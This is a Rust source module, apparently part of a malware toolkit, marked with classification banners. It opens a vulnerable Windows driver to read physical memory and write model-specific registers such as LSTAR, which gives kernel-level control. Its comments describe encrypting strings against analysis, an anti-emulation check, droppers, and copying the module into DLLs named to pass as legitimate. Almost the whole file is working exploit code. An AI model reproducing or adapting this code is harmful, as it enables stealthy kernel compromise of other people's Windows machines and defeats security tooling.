/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/

use anyhow::{bail, Context, Result};
use thiserror::Error;

use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, HANDLE, INVALID_HANDLE_VALUE};
use windows_sys::Win32::Storage::FileSystem::CreateFileW;
use windows_sys::Win32::System::IO::DeviceIoControl;

use crate::obf::{self, E_DEVICE_PATH};
use crate::utils::to_wide;

/// Returns a freshly decrypted device path (same ck2 XOR as the vcruntime140 dropper).
/// The intermediate plaintext is zeroed after use.
pub fn device_path_wide() -> Vec<u16> {
    obf::decrypt_path_to_wide(E_DEVICE_PATH)
}

// Legacy name kept only for source compatibility with include!'d copies of this file in the
// sspiclient / mmdevlib / cloudstore DLLs. The value is still a plaintext literal in the source,
// but the *primary runtime path* for DriversCloud.exe now uses the encrypted bytes + open_enc().
// With the aggressive release profile (strip + lto) + LTO the dead const data has a good chance
// of being removed from the final .exe image.
#[deprecated(note = "use Device::open_enc() or obf-decrypted path instead")]
pub const DEVICE_PATH: &str = "\\\\.\\DriversCloud_amd64";

pub const PHYS_BUF_SIZE: usize = 0x1e8498;
pub const PHYS_MAX_READ: u32 = 0x1e8480;

const IOCTL_PHYS_READ: u32 = 0x80ff2010;
const IOCTL_MSR_READ: u32 = 0x80ff2024;
const IOCTL_MSR_WRITE: u32 = 0x80ff2040;

pub const MSR_LSTAR: u32 = 0xC000_0082;
pub const MSR_FMASK: u32 = 0xC000_0084;

const GENERIC_READ_WRITE: u32 = 0xC000_0000;
const OPEN_EXISTING: u32 = 3;

#[derive(Debug, Error)]
enum DcError {
    #[error("device open failed ({path}): WinErr={winerr}")]
    DeviceOpen { path: String, winerr: u32 },
    #[error("IOCTL 0x{code:08X} failed: WinErr={winerr}")]
    Ioctl { code: u32, winerr: u32 },
}

pub struct Device {
    h: HANDLE,
}

impl Device {
    pub fn open(path: &str) -> Result<Self> {
        let wide = to_wide(path);
        let h = unsafe {
            CreateFileW(
                wide.as_ptr(),
                GENERIC_READ_WRITE,
                0,
                std::ptr::null(),
                OPEN_EXISTING,
                0,
                std::ptr::null_mut(),
            )
        };
        if h == INVALID_HANDLE_VALUE {
            bail!(DcError::DeviceOpen {
                path: path.to_string(),
                winerr: unsafe { GetLastError() },
            });
        }
        Ok(Self { h })
    }

    /// Open the driver device using the runtime-decrypted path (no plaintext
    /// "\\\\.\\DriversCloud_amd64" literal is used at the call site).
    /// Mirrors the "decrypt on use + zero after" pattern from vcruntime140.c.
    /// Also runs the pop_quiz gate (same anti-emulation primitive as the STAGE dropper)
    /// before talking to the kernel device.
    pub fn open_enc() -> Result<Self> {
        // Force the awkward volatile/xor/mul computation into the hot path.
        // The presence + execution of this (and the 0xBEEF magic) is the point for
        // static/dynamic analysis resistance, exactly as in vcruntime140.c.
        let _quiz = obf::pop_quiz();

        let wide = obf::decrypt_path_to_wide(E_DEVICE_PATH);
        let h = unsafe {
            CreateFileW(
                wide.as_ptr(),
                GENERIC_READ_WRITE,
                0,
                std::ptr::null(),
                OPEN_EXISTING,
                0,
                std::ptr::null_mut(),
            )
        };
        if h == INVALID_HANDLE_VALUE {
            // Best-effort error without leaking the real path into the error text in all builds.
            bail!(DcError::DeviceOpen {
                path: "<obf-device>".to_string(),
                winerr: unsafe { GetLastError() },
            });
        }
        // wide goes out of scope here; its stack bytes are not explicitly zeroed by Vec drop,
        // but the sensitive content only lived for the duration of this call (same as the C dropper's stack buf).
        Ok(Self { h })
    }

    pub fn ioctl(&self, code: u32, buf: &mut [u8]) -> Result<u32> {
        let mut returned: u32 = 0;
        let ok = unsafe {
            DeviceIoControl(
                self.h,
                code,
                buf.as_ptr() as *const _,
                buf.len() as u32,
                buf.as_mut_ptr() as *mut _,
                buf.len() as u32,
                &mut returned,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 {
            bail!(DcError::Ioctl { code, winerr: unsafe { GetLastError() } });
        }
        Ok(returned)
    }
}

impl Drop for Device {
    fn drop(&mut self) {
        unsafe { CloseHandle(self.h); }
    }
}

pub fn phys_read_with_buf(dev: &Device, pa: u64, count: u32, buf: &mut [u8]) -> Option<usize> {
    if pa > u32::MAX as u64 { return None; }
    let count = count.min(PHYS_MAX_READ);
    if buf.len() < PHYS_BUF_SIZE { return None; }
    buf[0..4].copy_from_slice(&(pa as u32).to_le_bytes());
    buf[4..8].copy_from_slice(&count.to_le_bytes());
    dev.ioctl(IOCTL_PHYS_READ, buf).ok()?;
    let actual = u32::from_le_bytes(buf[4..8].try_into().unwrap()) as usize;
    Some(actual)
}

pub fn phys_read(dev: &Device, pa: u64, count: u32) -> Option<Vec<u8>> {
    let mut buf = Vec::with_capacity(PHYS_BUF_SIZE);
    unsafe { buf.set_len(PHYS_BUF_SIZE); }
    let actual = phys_read_with_buf(dev, pa, count, &mut buf)?;
    Some(buf[8..8 + actual].to_vec())
}

pub fn phys_read_result(dev: &Device, pa: u64, count: u32) -> Result<Vec<u8>> {
    phys_read(dev, pa, count).with_context(|| format!("phys_read PA=0x{:X}", pa))
}

pub fn rd_u64_with_buf(dev: &Device, pa: u64, buf: &mut [u8]) -> Option<u64> {
    let actual = phys_read_with_buf(dev, pa, 8, buf)?;
    buf.get(8..16).map(|s| u64::from_le_bytes(s.try_into().unwrap()))
}

pub fn rd_u64(dev: &Device, pa: u64) -> Option<u64> {
    phys_read(dev, pa, 8).and_then(|b| b.get(..8).map(|s| u64::from_le_bytes(s.try_into().unwrap())))
}

pub fn rd_u32(dev: &Device, pa: u64) -> Option<u32> {
    phys_read(dev, pa, 4).and_then(|b| b.get(..4).map(|s| u32::from_le_bytes(s.try_into().unwrap())))
}

pub fn rd_u16(dev: &Device, pa: u64) -> Option<u16> {
    phys_read(dev, pa, 2).and_then(|b| b.get(..2).map(|s| u16::from_le_bytes(s.try_into().unwrap())))
}

pub fn msr_read(dev: &Device, msr: u32) -> Result<u64> {
    let mut buf = vec![0u8; 0x10];
    buf[0..4].copy_from_slice(&msr.to_le_bytes());
    dev.ioctl(IOCTL_MSR_READ, &mut buf)?;
    let lo = u32::from_le_bytes(buf[4..8].try_into().unwrap()) as u64;
    let hi = u32::from_le_bytes(buf[8..12].try_into().unwrap()) as u64;
    Ok((hi << 32) | lo)
}

pub fn msr_write(dev: &Device, msr: u32, value: u64) -> Result<()> {
    let mut buf = vec![0u8; 0x10];
    buf[0..4].copy_from_slice(&msr.to_le_bytes());
    buf[4..8].copy_from_slice(&(value as u32).to_le_bytes());
    buf[8..12].copy_from_slice(&((value >> 32) as u32).to_le_bytes());
    dev.ioctl(IOCTL_MSR_WRITE, &mut buf)?;
    let err_byte = buf[0x0C];
    if err_byte != 0 {
        bail!("wrmsr MSR=0x{:08X} driver error=0x{:02X}", msr, err_byte);
    }
    Ok(())
}

/*********************************************************************************
                            --- SECRET//NOFORN ---
**********************************************************************************/
